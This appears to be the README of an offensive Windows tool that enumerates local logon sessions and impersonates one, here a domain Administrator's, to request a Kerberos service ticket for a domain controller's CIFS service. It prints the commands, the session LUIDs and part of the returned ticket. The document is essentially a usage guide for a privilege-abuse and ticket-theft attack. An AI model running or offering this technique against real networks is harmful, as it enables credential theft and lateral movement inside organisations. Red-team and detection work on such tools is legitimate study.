## About
GIUDA-like session impersonation. Requires elevated local privileges.

## Usage
```
PS C:\Users\max\Downloads> .\ImpTgsReq_net462.exe --help
Description:
  Invoke an impersonative TGS-REQ

Usage:
  ImpTgsReq_net462 [command] [options]

Options:
  -l, --session-luid <session-luid>  The LUID of a session to impersonate while requesting an ST
  -s, --spn <spn>                    TGS sname property value (target service's SPN)
  --version                          Show version information
  -?, -h, --help                     Show help and usage information

Commands:
  enum-logon  List local logon sessions' LUIDs. Administrative privileges are required for querying other accounts'
              sessions.
```

Enumerate sessions:
```
ImpTgsReq.exe enum-logon

# ...
# SESSION : Font Driver Host\UMFD-3 SESSION_LUID=9076117
# SESSION : CONTOSO\max SESSION_LUID=5092338
# SESSION : CONTOSO\Administrator SESSION_LUID=4987137
# SESSION : CONTOSO\max SESSION_LUID=1389360
# SESSION : NT SERVICE\ksnproxy SESSION_LUID=507207
# ...
```
Impersonate:
```
PS C:\Users\max\Downloads> .\ImpTgsReq_net462.exe -l 4987137 -s CIFS/WIN-DC1@CONTOSO.LOCAL
[!] impersonated principal Sid : S-1-5-18
[!] principalName : NT AUTHORITY\SYSTEM
[#] Invoking LsaCallAuthenticationPackage() for TGS-REQ
[#] TGS-REP received. Parsing ST.
[!] ST : doIGDDCCBgigAwIBBaEDAgEWooIFETCCBQ1hggUJMIIFBaADAgEFoQ8bDUNPTlRPU08uTE9DQUyiGjAYoAMCAQKhETAPGwRDSUZTGwdXSU4tREMxo4IEzzCCBMugAwIBEqEDAgEGooIEvQSCBLkMQGpWwsAsGwfLBBNOKYNMuXegUcV6WH07ztxnk/TRUNCATED
```
